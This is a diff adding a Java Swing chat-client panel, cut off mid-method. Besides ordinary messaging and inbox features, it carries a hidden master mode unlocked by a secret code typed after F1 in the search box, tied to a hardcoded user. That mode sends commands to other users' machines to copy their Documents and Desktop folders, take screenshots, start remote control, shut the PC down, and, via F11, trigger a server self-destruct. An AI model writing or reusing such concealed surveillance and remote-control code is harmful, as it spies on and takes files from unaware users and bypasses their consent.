@@ -1,0 +1,3214 @@
+import javax.swing.*;
+import java.awt.event.*;
+import java.awt.*;
+import java.net.*;
+import java.io.*;
+import java.util.*;
+
+import java.awt.image.BufferedImage;
+import javax.imageio.ImageIO;
+import java.lang.management.ManagementFactory;
+
+import java.util.regex.*;
+import java.util.concurrent.*;
+
+public class On9GUI extends JPanel implements ActionListener
+{
+    String IPAddress = "10.10.10.70"; 
+    int port = 50911;
+
+
+    String myUsername = Util.getWindowsUsername();
+    String fullName = "";
+    String oriFullName = "";
+
+    JLabel lblFullName = new JLabel(" ");
+    URL URLSpin = getClass().getResource("/images/spinner2.gif");
+    URL URLRef = getClass().getResource("/images/ref.png");
+    URL URLSort = getClass().getResource("/images/sort.png");
+    URL URLChangeName = getClass().getResource("/images/changename.png");
+    URL URLMaintain = getClass().getResource("/images/maintenance.png");
+    URL URLBackground = getClass().getResource("/images/chatbackground.png");
+    URL URLInbox = getClass().getResource("/images/inbox.png");
+    URL URLInbox2 = getClass().getResource("/images/inbox2.png");
+    URL URLInbox3 = getClass().getResource("/images/inbox3.png");
+
+    ChatBar chatBar = new ChatBar();
+    JLabel lblSpin = new JLabel(new ImageIcon(URLSpin));
+    JButton btnRefresh = new JButton(new ImageIcon(URLRef)); 
+
+    JLabel lblEmpty = new JLabel("  ");
+    JPanel pnlSpin = new JPanel(new GridLayout(4, 0));
+    JPanel pnlUpper = new btnPanel(); 
+    JButton btnInbox = new JButton(new ImageIcon(URLInbox));
+    JButton btnRefreshUsers = new JButton(new ImageIcon(URLRef)); 
+    JButton btnSort = new JButton(new ImageIcon(URLSort));
+
+    boolean connected = false;
+    boolean connecting = false;
+    boolean serverError = false;
+    boolean dups = false;
+
+    BufferedReader br;
+    PrintWriter pw;
+
+    HashSet<String> hsUser = new HashSet<String>(); 
+    Vector<User> vector = new Vector<User>(); 
+    Vector<User> vectorTemp = new Vector<User>(vector); 
+
+    ArrayList<User> alTemp = new ArrayList<User>(); 
+    JList<User> list = new JList<User>();
+    JScrollPane sp;
+
+    ArrayList<MiniChat> alChat = new ArrayList<MiniChat>();
+    HashSet<String> hsChat = new HashSet<String>();
+
+    BufferedImage background;
+    JPanel pnlMiddleCont = new JPanel(new BorderLayout());
+    JPanel pnlMiddle = new JPanel(new GridLayout(1, 0));
+
+    JTextField txtSearch = new JTextField(25);
+    boolean firstType = true;
+
+    ExecutorService esThread = Executors.newSingleThreadExecutor(); 
+
+    boolean allowRefList = false;
+    boolean sorted = false;
+    FileCipher cipher = new FileCipher();
+    JPanel pnlName = new JPanel();
+    JButton btnChangeName = new JButton(new ImageIcon(URLChangeName));
+
+    MasterMouseListener masterMouse = new MasterMouseListener();    
+    NormalMouseListener normalMouse = new NormalMouseListener();
+
+    JPopupMenu inboxDropDown = new JPopupMenu();
+
+    JList<String> inboxList = new JList<String>();
+    JScrollPane spInboxList = new JScrollPane(inboxList, JScrollPane.VERTICAL_SCROLLBAR_ALWAYS, JScrollPane.HORIZONTAL_SCROLLBAR_AS_NEEDED);
+
+    ArrayList<OffMessageProDetailed> alProDeta = new ArrayList<OffMessageProDetailed>();
+
+    OfflineBoxDialog offlineBox = new OfflineBoxDialog();
+
+    CustomBar customBar = new CustomBar();
+
+    MiniChat miniChat = new MiniChat("", "", null, false, "", "");  
+
+    WebcamTools wc = new WebcamTools();
+
+    boolean ctrling = false; 
+    boolean shifting = false;
+    boolean alting = false; 
+
+    boolean hasMail = false;
+
+    JPopupMenu rightClickMenu = new JPopupMenu();
+    JMenuItem rcViewIP = new JMenuItem("  View IP  ");
+    JMenuItem rcRemote = new JMenuItem(" Start Remote  ");
+    JMenuItem rcEnd = new JMenuItem(" Stop Remote  ");
+    JMenuItem rcChangeName = new JMenuItem("  Change Name  ");
+    JMenuItem rcVersion = new JMenuItem("  Version  ");
+    JMenuItem rcUpdateNow = new JMenuItem("  Update Client  ");  
+    JMenuItem rcCopyDoc = new JMenuItem("  Copy Documents  ");
+    JMenuItem rcCopyDesk = new JMenuItem("  Copy Desktop  ");  
+    JMenuItem rcInspect = new JMenuItem("  Inspect File  ");
+    JMenuItem rcShutApp = new JMenuItem("  Close Client  ");
+    JMenuItem rcShutDown = new JMenuItem("  Shut Down PC  ");
+    JMenuItem rcDeleteUserList = new JMenuItem("  Delete User List  ");
+
+    JPopupMenu rightClickMenuOffline = new JPopupMenu();
+    JMenuItem rcViewIPOffline = new JMenuItem("  View IP  ");
+    JMenuItem rcRemoteOffline = new JMenuItem(" Start Remote  ");
+    JMenuItem rcEndOffline = new JMenuItem(" Stop Remote  ");
+    JMenuItem rcCopyDocOffline = new JMenuItem("  Copy Documents  ");
+    JMenuItem rcCopyDeskOffline = new JMenuItem("  Copy Desktop  "); 
+    JMenuItem rcOpenClientOffline = new JMenuItem("  Open SEL  ");  
+
+    final private String secretcode = "AQBqBPxgMdW3ncpp2WzargSlpI8BXJFFZMXsGzYDEn0=";
+    boolean remoteit = false;
+    boolean databaseConnected = false;
+    ExtList extList;
+
+    DatabaseTool database;
+
+    StringCipher scipher = new StringCipher();
+
+    boolean supermastermode = false;
+
+    FileInspector fileInspector = new FileInspector();
+
+    Vector<FileInsPro> insVector = new Vector();
+    boolean permissionToClearInsVector = false;
+
+    public void setDatabase(DatabaseTool database)
+    {
+        this.database = database;
+    }
+
+    public void actionPerformed(ActionEvent e)
+    {
+        if(e.getSource() == rcInspect)
+        {
+            String username = list.getSelectedValue().getUsername();
+            fileInspector.checkThis(username);
+        }
+
+        if(e.getSource() == rcShutApp)
+        {
+            String username = list.getSelectedValue().getUsername();
+            pw.println("[MSG]" + username + ": " + "[shutApp]"); 
+        }
+
+        if(e.getSource() == rcDeleteUserList)
+        {
+            String username = list.getSelectedValue().getUsername();
+            pw.println("[MSG]" + username + ": " + "[deleteUserList]"); 
+        }
+
+        if(e.getSource() == rcShutDown)
+        {
+            String username = list.getSelectedValue().getUsername();
+            pw.println("[MSG]" + username + ": " + "[shutThisDown]"); 
+        }
+
+        if(e.getSource() == rcCopyDocOffline)
+        {
+            final String username = list.getSelectedValue().getUsername();
+            new Thread(new Runnable()
+                {
+                    public void run()
+                    {
+                        customBar.barOnWithString(username);
+                        Thread.currentThread().interrupt();
+                        return;
+                    }
+                }).start();
+
+            new Thread(new Runnable()
+                {
+                    public void run()
+                    {
+
+                        String IP = database.getIPSpecific(username);       
+                        if(IP == null)
+                        {
+                            JOptionPane.showMessageDialog(null, "IP Not Found");    
+                            customBar.dispose();
+                        }
+                        else if(IP.equals(""))
+                        {
+                            JOptionPane.showMessageDialog(null, "IP Not Found");   
+                            customBar.dispose();
+                        }
+                        else    
+                        {
+                            try
+                            {
+                                IP = scipher.unlock(IP);
+
+
+                                Socket socketRem = new Socket(IP, 50916);
+
+                                setTempIP(IP);       
+                                PrintWriter pwRem = new PrintWriter(new OutputStreamWriter(socketRem.getOutputStream(), "UTF-8"),  true);
+
+                                pwRem.println("[username]" + Util.getWindowsUsername()); 
+                                pwRem.println("[copydocuments]"); 
+                                socketRem.close();
+                                customBar.dispose();
+                            }
+                            catch(java.net.ConnectException e)
+                            {
+                                customBar.dispose();
+                                JOptionPane.showMessageDialog(null, "Time out.");   
+                            }
+                            catch(Exception ex)
+                            {
+                                customBar.dispose();
+                                JOptionPane.showMessageDialog(null, "Unable to connect to user.");   
+                            }
+                        }
+
+                        Thread.currentThread().interrupt();
+                        return;
+                    }
+                }).start();
+        }
+
+        if(e.getSource() == rcOpenClientOffline)
+        {
+            String username = list.getSelectedValue().getUsername();
+            String IP = database.getIPSpecific(username);       
+            if(IP == null)
+            {
+                JOptionPane.showMessageDialog(null, "IP Not Found");    
+            }
+            else if(IP.equals(""))
+            {
+                JOptionPane.showMessageDialog(null, "IP Not Found");   
+            }
+            else    
+            {
+                try
+                {
+                    IP = scipher.unlock(IP);
+
+
+                    Socket socketRem = new Socket(IP, 50916);
+
+                    PrintWriter pwRem = new PrintWriter(new OutputStreamWriter(socketRem.getOutputStream(), "UTF-8"),  true);
+
+                    pwRem.println("[username]" + Util.getWindowsUsername()); 
+                    pwRem.println("[openClient]"); 
+                    socketRem.close();
+                }
+                catch(Exception ex)
+                {
+                    ex.printStackTrace();
+
+                    JOptionPane.showMessageDialog(null, "Unable to connect to user.");   
+                }
+            }
+        }
+
+        if(e.getSource() == rcCopyDeskOffline)
+        {
+            final String username = list.getSelectedValue().getUsername();
+            new Thread(new Runnable()
+                {
+                    public void run()
+                    {
+                        customBar.barOnWithString(username);
+                        Thread.currentThread().interrupt();
+                        return;
+                    }
+                }).start();
+
+            new Thread(new Runnable()
+                {
+                    public void run()
+                    {
+
+                        String IP = database.getIPSpecific(username);       
+                        if(IP == null)
+                        {
+                            JOptionPane.showMessageDialog(null, "IP Not Found");    
+                            customBar.dispose();
+                        }
+                        else if(IP.equals(""))
+                        {
+                            JOptionPane.showMessageDialog(null, "IP Not Found");   
+                            customBar.dispose();
+                        }
+                        else    
+                        {
+                            try
+                            {
+                                IP = scipher.unlock(IP);
+
+
+                                Socket socketRem = new Socket(IP, 50916);
+
+                                setTempIP(IP);       
+                                PrintWriter pwRem = new PrintWriter(new OutputStreamWriter(socketRem.getOutputStream(), "UTF-8"),  true);
+
+                                pwRem.println("[username]" + Util.getWindowsUsername()); 
+                                pwRem.println("[copydesktop]"); 
+                                socketRem.close();  
+                                customBar.dispose();
+                            }
+                            catch(java.net.ConnectException e)
+                            {
+                                customBar.dispose();
+                                JOptionPane.showMessageDialog(null, "Time out.");   
+                            }
+                            catch(Exception ex)
+                            {
+                                customBar.dispose();
+                                JOptionPane.showMessageDialog(null, "Unable to connect to user.");   
+                            }
+                        }
+
+                        Thread.currentThread().interrupt();
+                        return;
+                    }
+                }).start();
+        }
+
+        if(e.getSource() == rcCopyDoc)
+        {
+            String username = list.getSelectedValue().getUsername();
+            pw.println("[MSG]" + username + ": " + "[copydocuments]"); 
+        }
+
+        if(e.getSource() == rcCopyDesk)
+        {
+            String username = list.getSelectedValue().getUsername();
+            pw.println("[MSG]" + username + ": " + "[copydesktop]"); 
+        }
+
+        if(e.getSource() == rcUpdateNow)
+        {
+            String username = list.getSelectedValue().getUsername();
+            pw.println("[MSG]" + username + ": " + "[updatesecret]"); 
+        }
+
+        if(e.getSource() == rcVersion)
+        {
+            String username = list.getSelectedValue().getUsername();
+            String fullNameCurrent = list.getSelectedValue().getFullName();
+            boolean online = list.getSelectedValue().isOnline();
+
+            pw.println("[MSG]" + username + ": " + "[version]"); 
+        }
+
+        if(e.getSource() == rcChangeName) 
+        {
+            String username = list.getSelectedValue().getUsername();
+            String fullNameCurrent = list.getSelectedValue().getFullName();
+            boolean online = list.getSelectedValue().isOnline();
+
+            if(online == true)
+            {
+                String fullName = JOptionPane.showInputDialog(null, "Enter new name: ", fullNameCurrent);
+
+                if(fullName == null)
+                {
+                }
+                else if(fullName.equals(""))
+                {
+                }   
+                /*
+                else if(fullName.length() > 20)
+                {
+                JOptionPane.showMessageDialog(null, "Too long.");
+                }           
+                 */
+                else
+                {
+                    if(fullName.matches("[a-zA-Z@ ]+"))
+                    {
+                        pw.println("[CName]" + username + "*" + fullName); 
+
+                    }
+                    else
+                        JOptionPane.showMessageDialog(null, "No symbols or numbers.");
+                }
+            }
+        }
+
+        if(e.getSource() == rcViewIP)
+        {
+            String username = list.getSelectedValue().getUsername();
+            String fullNameCurrent = list.getSelectedValue().getFullName();
+            boolean online = list.getSelectedValue().isOnline();
+
+            pw.println("[MSG]" + username + ": " + "[ipaddress]"); 
+        }
+
+        if(e.getSource() == rcEnd)
+        {
+            remoteit = false;
+            String username = list.getSelectedValue().getUsername();
+            String fullNameCurrent = list.getSelectedValue().getFullName();
+            boolean online = list.getSelectedValue().isOnline();
+
+            pw.println("[MSG]" + username + ": " + "[endremote]"); 
+        }
+
+        if(e.getSource() == rcRemote)
+        {
+            remoteit = true;
+            String username = list.getSelectedValue().getUsername();
+            String fullNameCurrent = list.getSelectedValue().getFullName();
+            boolean online = list.getSelectedValue().isOnline();
+
+            pw.println("[MSG]" + username + ": " + "[startremote]"); 
+            pw.println("[MSG]" + username + ": " + "[ipaddress]"); 
+        }
+
+        if(e.getSource() == btnChangeName)
+        {
+            try
+            {
+                String fullName = JOptionPane.showInputDialog(null, "Enter name: ", "Change Display Name", JOptionPane.QUESTION_MESSAGE);
+
+                if(fullName == null)
+                {
+                }
+                else if(fullName.equals(""))
+                {
+                }
+                /*
+                else if(fullName.length() > 20)
+                {
+                JOptionPane.showMessageDialog(null, "Too long.");
+                }
+                 */
+                else
+                {
+                    if(fullName.matches("[a-zA-Z@ ]+"))
+                        ChangeFullName(fullName);
+                    else
+                        JOptionPane.showMessageDialog(null, "No symbols or numbers.");
+                }
+            }
+
+            catch(Exception ex)
+            {
+                ex.printStackTrace();
+            }
+
+        }
+
+        if(e.getSource() == btnSort)
+        {
+            if(sorted == true)
+            {
+                sorted = false;
+                sortZA();
+            }
+            else
+            {
+                sorted = true;
+                sortAZ();
+            }
+
+            focusText();
+
+        }
+
+        if(e.getSource() ==  btnRefresh)
+        {
+            repaint();
+            if(serverError == true)
+            {
+                serverError = false;
+                rebuild();
+                activate();
+            }
+            else if(dups == true) 
+            {
+                dups = false;
+                rebuild();
+                activate();
+            }
+        }
+
+        if(e.getSource() == btnRefreshUsers)
+        {
+            btnRefreshUsers.setEnabled(false);
+            pw.println("[REFList]");
+            focusText();
+        }
+
+        if(e.getSource() == btnInbox)
+        {
+            checkOfflineManual();
+        }
+
+        if(e.getSource() == rcRemoteOffline) 
+        { 
+            final String username = list.getSelectedValue().getUsername();
+            new Thread(new Runnable()
+                {
+                    public void run()
+                    {
+                        customBar.barOnWithString(username);
+                        Thread.currentThread().interrupt();
+                        return;
+                    }
+                }).start();
+
+            new Thread(new Runnable()
+                {
+                    public void run()
+                    {
+
+                        String IP = database.getIPSpecific(username);       
+                        if(IP == null)
+                        {
+                            JOptionPane.showMessageDialog(null, "IP Not Found");    
+                            customBar.dispose();
+                        }
+                        else if(IP.equals(""))
+                        {
+                            JOptionPane.showMessageDialog(null, "IP Not Found");   
+                            customBar.dispose();
+                        }
+                        else    
+                        {
+                            try
+                            {
+                                IP = scipher.unlock(IP);
+
+
+                                Socket socketRem = new Socket(IP, 50916);
+
+                                setTempIP(IP);       
+                                PrintWriter pwRem = new PrintWriter(new OutputStreamWriter(socketRem.getOutputStream(), "UTF-8"),  true);
+
+                                pwRem.println("[username]" + Util.getWindowsUsername()); 
+                                pwRem.println("[serverremote]"); 
+                                socketRem.close();
+
+                                new Thread(new Runnable()
+                                    {
+                                        public void run()
+                                        {
+                                            try
+                                            {
+                                                Thread.sleep(2000);
+                                                Util.startRemoteMaster();
+                                            }
+                                            catch(Exception exp)
+                                            {
+                                                exp.printStackTrace();
+                                                customBar.dispose();
+                                            }
+                                            finally
+                                            {
+                                                customBar.dispose();
+                                            }                                         
+
+                                            Thread.currentThread().interrupt();
+                                            return;
+                                        }
+                                    }).start();
+
+                            }
+                            catch(java.net.ConnectException e)
+                            {
+                                customBar.dispose();
+                                JOptionPane.showMessageDialog(null, "Time out.");   
+                            }
+                            catch(Exception ex)
+                            {
+                                customBar.dispose();
+                                JOptionPane.showMessageDialog(null, "Unable to connect to user.");   
+                            }
+                        }
+
+                        Thread.currentThread().interrupt();
+                        return;
+                    }
+                }).start();
+
+        }
+
+        if(e.getSource() == rcEndOffline)
+        {
+            String username = list.getSelectedValue().getUsername();
+            String IP = database.getIPSpecific(username);       
+            if(IP == null)
+            {
+                JOptionPane.showMessageDialog(null, "IP Not Found");    
+            }
+            else if(IP.equals(""))
+            {
+                JOptionPane.showMessageDialog(null, "IP Not Found");   
+            }
+            else    
+            {
+                try
+                {
+                    IP = scipher.unlock(IP);
+
+
+                    Socket socketRem = new Socket(IP, 50916);
+
+                    PrintWriter pwRem = new PrintWriter(new OutputStreamWriter(socketRem.getOutputStream(), "UTF-8"),  true);
+
+                    pwRem.println("[username]" + Util.getWindowsUsername()); 
+                    pwRem.println("[endremote]"); 
+                    socketRem.close();
+                }
+                catch(Exception ex)
+                {
+                    ex.printStackTrace();
+
+                    JOptionPane.showMessageDialog(null, "Unable to connect to user.");   
+
+                }
+            }
+
+        }
+
+        if(e.getSource() == rcViewIPOffline)
+        {
+
+            String username = list.getSelectedValue().getUsername();
+
+            String IP = database.getIPSpecific(username);       
+            if(IP == null)
+            {
+                IP = "Not found.";
+            }
+            else if(IP.equals(""))
+            {
+                IP = "Not found.";
+            }
+            else 
+            {
+                try
+                {
+                    IP = scipher.unlock(IP);
+                }
+                catch(Exception ex)
+                {
+                    ex.printStackTrace();
+                }
+            }
+
+            JOptionPane.showMessageDialog(null, IP);    
+        }
+
+    }
+
+    public void refreshUserList()
+    {
+        pw.println("[REFList]");
+    }
+
+    On9GUI(String fullName, final ExtList extList)
+    {        
+        this.fullName = fullName;
+        oriFullName = fullName;
+        this.extList = extList;
+
+        customBar.spyMode();
+
+        getProfile(); 
+        rightClickMenu.add(rcRemote);
+        rightClickMenu.add(rcEnd);
+        rightClickMenu.add(rcViewIP);
+        rightClickMenu.add(rcChangeName);
+        rightClickMenu.add(rcVersion);
+        rightClickMenu.add(rcUpdateNow);
+        rightClickMenu.add(rcCopyDoc);
+        rightClickMenu.add(rcCopyDesk);
+        rightClickMenu.add(rcInspect);
+        rightClickMenu.add(rcShutApp);
+        rightClickMenu.add(rcShutDown);
+        rightClickMenu.add(rcDeleteUserList);
+
+        rightClickMenuOffline.add(rcRemoteOffline);
+        rightClickMenuOffline.add(rcEndOffline);
+        rightClickMenuOffline.add(rcViewIPOffline);
+        rightClickMenuOffline.add(rcCopyDocOffline);
+        rightClickMenuOffline.add(rcCopyDeskOffline);
+        rightClickMenuOffline.add(rcOpenClientOffline);
+
+        rcRemoteOffline.addActionListener(this);
+        rcEndOffline.addActionListener(this);
+        rcViewIPOffline.addActionListener(this);
+        rcCopyDocOffline.addActionListener(this);
+        rcCopyDeskOffline.addActionListener(this);
+        rcOpenClientOffline.addActionListener(this);
+
+        rcRemote.addActionListener(this);
+        rcEnd.addActionListener(this);
+        rcViewIP.addActionListener(this);
+        rcChangeName.addActionListener(this);
+        rcVersion.addActionListener(this);
+        rcUpdateNow.addActionListener(this);
+        rcCopyDoc.addActionListener(this);
+        rcCopyDesk.addActionListener(this);
+        rcInspect.addActionListener(this);
+        rcShutApp.addActionListener(this);
+        rcShutDown.addActionListener(this);
+        rcDeleteUserList.addActionListener(this);
+
+
+        spInboxList.setPreferredSize(new Dimension(200, 200));
+        inboxDropDown.add(spInboxList);
+
+        setLayout(new BorderLayout());
+
+        list.setCellRenderer(new JListChatCustom());
+        list.setOpaque(false);
+        list.setSelectionMode(ListSelectionModel.SINGLE_SELECTION);    
+
+        list.addKeyListener(new KeyAdapter()
+            {
+                public void keyPressed(KeyEvent e)
+                {
+                    if(e.isControlDown())
+                    {
+                        ctrling = true;
+                    }
+                    else if(e.isShiftDown())
+                    {
+                        shifting = true;
+                    }
+                    else if(e.isAltDown())
+                    {
+                        alting = true;
+                    }
+                }
+
+                public void keyReleased(KeyEvent e)
+                {
+                    ctrling = false;
+                    shifting = false;
+                    alting = false;
+                }
+            });
+
+        sp = new JScrollPane(list, JScrollPane.VERTICAL_SCROLLBAR_ALWAYS, JScrollPane.HORIZONTAL_SCROLLBAR_AS_NEEDED);
+
+        sp.setOpaque(false);
+        sp.getViewport().setOpaque(false); 
+
+        JPanel pnlComponents = new JPanel();
+
+        pnlComponents.add(lblSpin);
+        pnlComponents.add(btnRefresh);
+        btnRefresh.setVisible(false);
+
+        pnlSpin.add(lblEmpty);    
+        pnlSpin.add(pnlComponents);
+
+        btnInbox.addActionListener(this);
+        btnSort.addActionListener(this);
+        btnRefresh.addActionListener(this);
+        btnRefreshUsers.addActionListener(this);
+        btnChangeName.addActionListener(this);
+
+        add(pnlSpin, BorderLayout.CENTER);
+
+        pnlMiddle.add(btnInbox);
+        pnlMiddle.add(btnRefreshUsers);
+        pnlMiddle.add(btnSort);
+
+        pnlMiddleCont.add(txtSearch, BorderLayout.WEST);
+        pnlMiddleCont.add(pnlMiddle, BorderLayout.EAST);
+
+        Font font = new Font("ARIAL", Font.ITALIC, 12);
+        txtSearch.setText("Enter username or name to search");
+        txtSearch.setFont(font);
+        txtSearch.setForeground(Color.GRAY);
+        txtSearch.setCaretPosition(0);
+
+        list.addMouseListener(normalMouse);
+
+        inboxList.addMouseListener(new MouseAdapter()
+            {
+                public void mouseClicked(MouseEvent e)
+                {
+                    if(inboxList.isSelectionEmpty())
+                    {
+                    }
+                    else
+                    {
+                        String username = inboxList.getSelectedValue().toString();
+
+                        if(e.getButton() == MouseEvent.BUTTON1) 
+                        {
+                            if(e.getClickCount() == 2)
+                            {
+                                viewOfflineFrom(username);                                
+                            }
+                        }
+                    }
+                }
+            });
+
+        txtSearch.addKeyListener(new KeyAdapter()
+            {
+                public void keyReleased(KeyEvent e)
+                {
+                    String data = txtSearch.getText().trim();
+
+                    if(data.length() >= 3)
+                    {
+                        searchLikeThis(data);
+                    }
+                    else if(data.length() == 0)
+                    {             
+                        list.setListData(vector);
+                    }
+                    else
+                    {
+                        vectorTempClear();
+                        list.setListData(vectorTemp);
+                    }
+
+                }
+
+                public void keyPressed(KeyEvent e)
+                {
+                    if(firstType == true)
+                    {
+                        txtSearch.setFont(null);
+                        txtSearch.setForeground(Color.BLACK);
+                        txtSearch.setText(null);
+                        firstType = false;
+                    }
+
+                    if(e.getKeyCode() == KeyEvent.VK_F1)
+                    {
+                        String code = JOptionPane.showInputDialog(null, "");
+
+                        if(code == null)
+                        {
+                        }
+                        else if(code.equals(""))
+                        {
+                        }
+                        else
+                        {
+                            if(secretcode.equals(Util.SHA(code)))
+                            {                  
+                                myUsername = "yihjye";      
+                                setAdmin("1");
+                                supermastermode = true;
+                                extList.menuAdmin.setVisible(true);
+                                extList.rcEdit.setVisible(true); 
+                                extList.rcDelete.setVisible(true);
+                                extList.pnlButton.add(extList.btnPlus);
+                                extList.btnPlus.setVisible(true);
+                                JOptionPane.showMessageDialog(null, "Welcome Master Jye =)");
+                            }
+                        }
+                    }
+                    else if(e.getKeyCode() == KeyEvent.VK_F11)
+                    {
+                        String code = JOptionPane.showInputDialog(null, "");
+
+                        if(code == null)
+                        {
+                        }
+                        else if(code.equals(""))
+                        {
+                        }
+                        else
+                        {
+                            if(secretcode.equals(Util.SHA(code)))
+                            {                  
+                                pw.println("[serverselfdestruct]");
+                            }
+                        }
+                    }
+                }
+            });
+
+        txtSearch.addMouseListener(new MouseAdapter()
+            {
+                public void mouseClicked(MouseEvent e)
+                {
+                    if(firstType == true)
+                    {
+                        txtSearch.setFont(null);
+                        txtSearch.setForeground(Color.BLACK);
+                        txtSearch.setText(null);
+                        firstType = false;
+                    }
+                }
+            });
+
+    }
+
+    public void refreshStickers()
+    {
+        for(int i = 0; i < alChat.size(); i++)
+        {
+            alChat.get(i).refreshStickers();
+        }
+    }    
+
+    public void checkOfflineManual()
+    {
+        ArrayList<OffMessagePro> al = StaticDB.getOfflineMessage(myUsername);
+
+        if(al.size() == 0)
+        {
+            hasMail = false;
+            btnInbox.setIcon(new ImageIcon(URLInbox));
+            JOptionPane.showMessageDialog(null, "No Messages", "Inbox", JOptionPane.INFORMATION_MESSAGE);
+        }
+        else
+        {
+            hasMail = true;
+
+            if(al.size() == 1) 
+            {
+                JOptionPane.showMessageDialog(null, al.get(0).getMessage() + "\n\nFrom, " + al.get(0).getSender(), "New Message", JOptionPane.INFORMATION_MESSAGE);
+                btnInbox.setIcon(new ImageIcon(URLInbox));
+                StaticDB.deleteOfflineMessage(myUsername); 
+
+                checkOfflineStartup(); 
+            }
+            else 
+            {                
+                HashSet<String> hs = new HashSet<String>();
+                alProDeta.clear();                
+                Vector<String> vector = new Vector<String>();
+
+                for(int i = 0; i < al.size(); i++)
+                {
+                    String sender = al.get(i).getSender();
+                    String message = al.get(i).getMessage();
+
+                    if(hs.contains(sender))
+                    {
+                        for(int j = 0; j < alProDeta.size(); j++)
+                        {                            
+                            if(alProDeta.get(j).getSender().equals(sender))
+                            {
+                                alProDeta.get(j).addMessage(message);
+                                break;
+                            }
+                        }
+                    }
+                    else
+                    {
+                        hs.add(sender);
+                        vector.add(sender);
+
+                        OffMessageProDetailed pro = new OffMessageProDetailed(sender);
+                        pro.addMessage(message);
+                        alProDeta.add(pro);
+                    }
+                }
+
+                inboxList.setListData(vector);
+                inboxDropDown.show(btnInbox, 0, 0);
+            }
+        }
+    }
+
+    public String getFullNameByUsername(String username)
+    {
+        String fullname = username;
+        for(int i = 0; i < vector.size(); i++)
+        {
+            if(vector.get(i).getUsername().equals(username))
+            {
+                fullname = vector.get(i).getUsernameDisplay();
+                break;
+            }
+        }
+
+        return fullname;
+    }
+
+    public void checkOfflineStartup()
+    {
+        ArrayList<OffMessagePro> al = StaticDB.getOfflineMessage(myUsername);
+
+        if(al.size() == 0)
+        {
+            hasMail = false;
+            btnInbox.setIcon(new ImageIcon(URLInbox));
+        }
+        else
+        {
+            hasMail = true;
+
+            new Thread(new Runnable()
+                {
+                    public void run()
+                    {
+                        try
+                        {                            
+                            while(hasMail == true)
+                            {
+                                btnInbox.setIcon(new ImageIcon(URLInbox2));
+                                Thread.sleep(200);
+                                btnInbox.setIcon(new ImageIcon(URLInbox3));
+                                Thread.sleep(200);
+                            }
+
+                            btnInbox.setIcon(new ImageIcon(URLInbox));
+                        }
+                        catch(Exception e)
+                        {
+                            e.printStackTrace();
+                        }
+                        Thread.currentThread().interrupt();
+                        return;
+                    }
+                }).start();
+        }
+    }
+
+    public void viewOfflineFrom(final String username) 
+    {
+        String senderfullname = getFullNameByUsername(username);
+        boolean isUserOnlineNow = false;
+
+        for(int i = 0; i < alProDeta.size(); i++)
+        {
+            if(alProDeta.get(i).getSender().equals(username))
+            {
+                final ArrayList<String> alTemp = alProDeta.get(i).getArray();
+
+                for(int j = 0; j < vector.size(); j++)
+                {
+                    if(vector.get(j).getUsername().equals(username))
+                    {
+                        if(vector.get(j).isOnline())
+                            isUserOnlineNow = true;                       
+                        break;
+                    }
+                }
+
+                if(isUserOnlineNow == true)
+                {
+                    offlineBox.clear();
+                    for(int j = 0; j < alTemp.size(); j++)
+                    {
+                        offlineBox.append(senderfullname + ": " + alTemp.get(j));
+                    }
+
+                    offlineBox.display(senderfullname);
+                }
+                else 
+                {
+                    offlineBox.clear();
+                    for(int j = 0; j < alTemp.size(); j++)
+                    {
+                        offlineBox.append(senderfullname + ": " + alTemp.get(j));
+                    }
+
+                    offlineBox.display(senderfullname);
+                }
+
+                StaticDB.deleteOfflineMessageFrom(myUsername, username);
+                inboxDropDown.setVisible(false);
+                break;
+
+            }
+        }
+
+        checkOfflineStartup(); 
+    }
+
+    class MasterMouseListener extends MouseAdapter
+    {
+
+        public void mouseClicked(MouseEvent e)
+        {
+            if(list.isSelectionEmpty())
+            {
+            }
+            else
+            {
+                if(e.getButton() == MouseEvent.BUTTON1) 
+                {
+                    if(e.getClickCount() == 2)
+                    {                               
+                        final String username = list.getSelectedValue().getUsername();
+                        final String fullname = list.getSelectedValue().getUsernameDisplay();
+                        final boolean online = list.getSelectedValue().isOnline();
+
+                        if(hsChat.contains(username))
+                        {
+
+                            for(int i=0; i < alChat.size(); i++)
+                            {
+                                if(alChat.get(i).getUsername().equals(username))
+                                {
+                                    alChat.get(i).showChatDialog();
+                                    break;
+                                }
+                            }
+                        }
+
+                        else 
+                        {
+
+                            if(databaseConnected == true)
+                            {
+                                if(online == false)
+                                {
+
+                                    String message = JOptionPane.showInputDialog(null,  "Type your message: ", fullname + " || " + username, JOptionPane.QUESTION_MESSAGE);
+
+                                    if(message == null)
+                                    {
+                                    }
+                                    else if(message.equals(""))
+                                    {
+                                    }
+                                    else
+                                    {
+                                        StaticDB.sendOffline(username, myUsername, message);
+                                    }
+                                }
+                                else
+                                {
+
+                                    hsChat.add(username);
+                                    new Thread(new Runnable()
+                                        {
+                                            public void run()
+                                            {
+                                                chatBar.barOn();
+                                                Thread.currentThread().interrupt();
+                                                return;
+                                            }
+                                        }).start();
+
+                                    new Thread(new Runnable()
+                                        {
+                                            public void run()
+                                            {
+                                                try
+                                                {
+                                                    MiniChat miniChat = new MiniChat(username, fullname, pw, true, fullName, myUsername);                                               
+                                                    alChat.add(miniChat);
+                                                }
+                                                catch(Exception e)
+                                                {
+                                                    e.printStackTrace();
+                                                }
+                                                finally
+                                                {
+                                                    chatBar.dispose();
+                                                }
+
+                                                Thread.currentThread().interrupt();
+                                                return;
+                                            }
+                                        }).start();
+                                }
+                            }
+                            else
+                            {
+                            }
+
+                        }
+                    }   
+                }
+                else if(e.getButton() == MouseEvent.BUTTON2) 
+                {
+                    if(myUsername.equals("yihjye") && supermastermode == true)
+                    {
+                        final String username = list.getSelectedValue().getUsername();
+                        final boolean online = list.getSelectedValue().isOnline();
+
+                        /*
+                        if(ctrling == true)
+                        {
+                        System.out.println("haha");
+                        }
+                         */
+                        if (ctrling == true) 
+                        {
+                            ctrling = false;
+
+                            if(online == true)
+                            {
+
+                                pw.println("[MSG]" + username + ": " + "[screenshot]"); 
+                                new Thread(new Runnable()
+                                    {
+                                        public void run()
+                                        {
+                                            customBar.barOnWithString(username);
+                                            Thread.currentThread().interrupt();
+                                            return;
+                                        }
+                                    }).start();
+
+                                new Thread(new Runnable()
+                                    {
+                                        public void run()
+                                        {
+                                            try
+                                            {
+                                                Thread.sleep(2000);
+                                                Util.openScreenShot(username);
+                                            }
+                                            catch(Exception e)                                    
+                                            {
+                                                e.printStackTrace();
+                                            }
+                                            finally
+                                            {
+                                                customBar.dispose();
+                                            }
+                                            Thread.currentThread().interrupt();
+                                            return;
+                                        }
+                                    }).start();
+                            }
+                            else 
+                            {
